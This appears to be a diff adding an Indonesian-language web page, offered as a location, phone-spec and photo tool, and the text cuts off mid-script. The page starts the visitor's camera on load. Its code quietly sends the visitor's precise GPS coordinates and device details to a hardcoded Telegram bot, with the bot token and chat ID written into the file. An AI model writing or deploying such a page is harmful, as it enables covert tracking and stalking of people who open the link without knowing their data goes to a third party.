@@ -1,0 +1,117 @@
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lacak Lokasi, Cek Spesifikasi HP, dan Ambil Foto</title>
+  <style>
+    body {
+      background-color: #000000;
+      color: #ADD8E6; /* Warna biru muda */
+    }
+    #lacak {
+      background-color: #4CAF50;
+      color: #ffffff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #lacak:hover {
+      background-color: #3e8e41;
+    }
+    #lokasi {
+      font-size: 24px;
+      font-weight: bold;
+      color: #ADD8E6; /* Warna biru muda */
+    }
+    #spesifikasi {
+      font-size: 18px;
+      font-weight: bold;
+      color: #ADD8E6; /* Warna biru muda */
+    }
+    #camera {
+      width: 640px;
+      height: 480px;
+      border: 1px solid #ffffff;
+    }
+    #ambil-foto {
+      background-color: #4CAF50;
+      color: #ffffff;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #ambil-foto:hover {
+      background-color: #3e8e41;
+    }
+  </style>
+</head>
+<body>
+  <h1 style="color: #ADD8E6;">Lacak Lokasi, Cek Spesifikasi HP, dan Ambil Foto</h1>
+  <button id="lacak">Lacak Lokasi</button>
+  <button id="cek-spesifikasi">Cek Spesifikasi HP</button>
+  <button id="ambil-foto">Ambil Foto</button>
+  <div id="lokasi"></div>
+  <div id="spesifikasi"></div>
+  <video id="camera" autoplay></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <script>
+    const lacakButton = document.getElementById('lacak');
+    const cekSpesifikasiButton = document.getElementById('cek-spesifikasi');
+    const ambilFotoButton = document.getElementById('ambil-foto');
+    const lokasiElement = document.getElementById('lokasi');
+    const spesifikasiElement = document.getElementById('spesifikasi');
+    const cameraElement = document.getElementById('camera');
+    const canvasElement = document.getElementById('canvas');
+    const tokenBot = '7769807196:AAHwvbEqo763nOo8UQQc2kngutjBIkDJAYY'; // Ganti dengan token bot Telegram Anda
+    const chatId = '7895289556'; // Ganti dengan ID chat Telegram Anda
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        cameraElement.srcObject = stream;
+      })
+      .catch(error => {
+        console.error(error);
+      });
+
+    lacakButton.addEventListener('click', () => {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lng = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        lokasiElement.innerHTML = `Lokasi: ${lat}, ${lng} (Akurasi: ${accuracy} meter)`;
+
+        // Kirim lokasi ke bot Telegram
+        const url = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Lokasi: ${lat}, ${lng} (Akurasi: ${accuracy} meter)`;
+        fetch(url)
+          .then(res => res.json())
+          .then(data => console.log(data))
+          .catch(err => console.error(err));
+      }, error => {
+        console.error(error);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 5000,
+        maximumAge: 0
+      });
+    });
+
+    cekSpesifikasiButton.addEventListener('click', () => {
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const deviceMemory = navigator.deviceMemory;
+      const hardwareConcurrency = navigator.hardwareConcurrency;
+      spesifikasiElement.innerHTML = `Spesifikasi HP:
+        <br> User Agent: ${userAgent}
+        <br> Platform: ${platform}
+        <br> Device Memory: ${deviceMemory} GB
+        <br> Hardware Concurrency: ${hardwareConcurrency} core`;
+
+      // Kirim spesifikasi ke bot Telegram
+      const url = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Spesifikasi HP:
+        User Agent: ${userAgent}
+        Platform: ${platform}
+        Device
+```
